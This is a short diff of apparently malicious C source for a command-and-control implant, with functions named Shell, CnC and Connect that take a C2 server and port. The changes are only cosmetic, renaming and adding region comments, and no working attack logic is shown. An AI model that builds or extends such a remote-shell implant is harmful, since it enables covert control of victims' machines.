@@ -14,6 +14,7 @@
 
 /* #region Base64 functions */
 
+
 size_t b64_encoded_size(size_t inlen)
 {
 	size_t ret;
@@ -285,6 +286,7 @@ void Shell(char* C2Server, int C2Port)
 }
 /* #endregion */
 
+/* #region Command&Control logics */
 void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 	while (true) {
 		/* #region Connection verification */
@@ -422,8 +424,9 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 		memset(RecvData, 0, sizeof(RecvData));
 	}
 }
+/* #endregion */
 
-/* #region Beacon logics */
+/* #region Connection logics */
 void Connect(char* C2Server, int C2Port)
 {
 	SOCKET tcpsock;
